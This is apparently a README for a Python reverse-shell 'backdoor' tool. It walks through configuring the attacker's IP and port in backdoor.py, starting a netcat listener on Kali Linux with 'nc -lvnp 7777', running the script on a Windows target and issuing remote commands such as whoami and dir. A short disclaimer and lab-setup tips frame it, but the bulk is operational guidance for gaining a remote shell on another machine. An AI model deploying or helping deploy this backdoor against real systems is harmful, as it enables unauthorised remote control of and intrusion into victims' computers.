🚨 Important: Use this tool only on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal and unethica

🚦 Features
Remote Command Execution: Run system commands remotely on the target machine.
Directory Navigation: Change directories using cd commands.
Simple Setup: Easy to configure and deploy

🖥️ Requirements
Attacker Machine (Kali Linux):
Python 3.x
Netcat (nc) pre-installed (apt install netcat)

Target Machine (Windows):
Python 3.x installed
Internet Connection

1. Clone the Repository:
 cd backdoor

2.Modify the Backdoor Script:
Open backdoor.py in a text editor and configure the IP address and port

IP = "192.168.0.112"  # Replace with your Kali Linux IP
PORT = 7777          # Replace with your desired listening port

3. Set Up a Listener on Kali Linux:
nc -lvnp 7777

-l: Listen mode
-v: Verbose output
-n: Numeric-only IP addresses (no DNS)

4. Execute the Backdoor Script on the Target Machine:
python backdoor.py

5. Interact with the Target Machine
whoami
dir
cd C:\Users
To exit the session, type:
exit



🧪 Testing in a Lab Environment:
Use Virtual Machines (VMs) like VirtualBox or VMware to create a safe lab.
Set up a Windows VM as the target and Kali Linux as the attacker.
Keep the environment isolated to avoid unintended network exposure.